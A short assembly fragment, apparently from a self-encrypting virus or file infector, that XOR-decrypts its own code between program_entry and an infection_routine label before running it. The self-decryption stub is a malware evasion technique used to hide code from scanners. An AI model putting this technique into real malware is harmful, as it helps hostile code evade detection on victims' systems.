	; uncipher first part of the code
	lea rdi, [rel program_entry]			; data = &program_entry
	mov rsi, infection_routine - program_entry	; size = infection_routine - program_entry
	lea rdx, [rel key]				; key = key
	mov rcx, [rel key_size]				; key_size = key_size
	cmp rcx, 0					; if (key_size == 0)
	je program_entry				; 	goto program_entry
	call xor_cipher					; xor_cipher(data, size, key, key_size)
